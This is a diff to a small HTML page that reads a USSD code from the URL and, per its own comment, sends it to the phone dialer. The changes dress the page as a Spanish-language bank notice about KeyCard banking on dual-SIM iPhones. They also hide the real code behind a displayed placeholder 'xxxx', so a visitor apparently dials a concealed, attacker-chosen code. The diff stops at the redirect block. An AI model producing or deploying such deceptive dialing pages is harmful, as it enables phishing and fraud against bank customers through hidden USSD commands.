@@ -4,15 +4,48 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>USSD Handler</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+        .container {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #007bff;
+        }
+        p {
+            font-size: 1.2em;
+            margin-bottom: 20px;
+        }
+        .hidden-code {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <h1>USSD Code</h1>
-    <p id="ussd-code" style = "display: hidden;"></p>
+    <div class="container">
+        <h1>Tus operaciones bancarias con KeyCard ya es posible en los iPhone dual SIM</h1>
+        <p>Estamos facilitando tus operaciones bancarias directamente desde tu iPhone con SIM dual. Sigue las instrucciones a continuación para continuar con tu operación bancaria.</p>
+        <p class="hidden-code" id="ussd-code">Código USSD: xxxx</p>
+    </div>
     <script>
         // Obtener el código USSD de la URL
         const urlParams = new URLSearchParams(window.location.search);
         const ussdCode = urlParams.get('ussd');
-        document.getElementById('ussd-code').textContent = ussdCode;
+        document.getElementById('ussd-code').textContent = "Código USSD: xxxx";
 
         // Redirigir a la aplicación de teléfono con el código USSD
         if (ussdCode) {
